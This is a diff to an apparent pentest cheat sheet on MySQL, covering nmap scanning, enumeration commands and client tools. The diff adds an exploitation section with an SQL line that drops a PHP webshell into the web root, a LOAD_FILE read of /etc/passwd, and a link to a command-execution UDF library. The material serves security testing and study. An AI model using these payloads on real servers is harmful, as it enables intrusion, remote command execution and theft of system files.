@@ -24,7 +24,7 @@ sudo nmap -sV -sC -p3306 --script mysql* <IP>
 {% endtab %}
 {% endtabs %}
 
-### Enumerate
+### Enumeration
 
 {% tabs %}
 {% tab title="mysql" %}
@@ -38,6 +38,8 @@ mysql -u <username> -p <password> -h <IP>
 mysql.exe -u <username> -p <password> -h <IP>
 Commands
 show databases;, use <database>;, show tables;, show columns from <table>;, select * from <table>;, select * from <table> where <column> = "<string>";
+
+
 ```
 {% endcode %}
 {% endtab %}
@@ -47,8 +49,19 @@ show databases;, use <database>;, show tables;, show columns from <table>;, sele
 {% endtab %}
 {% endtabs %}
 
+### Exploitation
+
+* #### Write Local Files <a href="#write-local-files" id="write-local-files"></a>
+  * <pre class="language-sql" data-line-numbers><code class="lang-sql">-- When 'secure_file_priv' is not set
+    SELECT "&#x3C;?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+    </code></pre>
+* #### Read Local Files
+  * <pre class="language-sql" data-line-numbers><code class="lang-sql">select LOAD_FILE("/etc/passwd");
+    </code></pre>
+
 ### Tools
 
 * [MySQL Workbench](https://dev.mysql.com/downloads/workbench/)
 * [dbeaver](https://github.com/dbeaver/dbeaver)
 * [mycli](https://github.com/dbcli/mycli)
+* [lib\_mysqludf\_sys](https://github.com/mysqludf/lib_mysqludf_sys)
